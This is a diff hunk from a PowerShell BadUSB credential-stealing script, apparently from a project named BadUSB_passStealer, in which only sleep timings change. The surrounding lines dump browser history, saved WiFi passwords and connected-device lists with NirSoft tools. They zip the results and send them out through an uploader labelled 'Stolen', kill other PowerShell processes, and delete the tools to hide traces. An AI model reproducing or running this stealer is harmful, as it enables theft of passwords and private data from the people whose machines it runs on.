@@ -10,11 +10,11 @@ Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_fi
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext dust_history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext dust_wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext dust_connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 5 #Wait for 60 seconds (because connected devices file take a minute to be created)
+Start-Sleep -Seconds 10 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Compress-Archive dust_* dusted.zip
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 5
 .\uploader.exe -f dusted.zip -c "Stolen $env:UserDomain"
-Start-Sleep -Seconds 20 #Wait for 60 seconds (because connected devices file take a minute to be created)
+Start-Sleep -Seconds 40 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 20 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
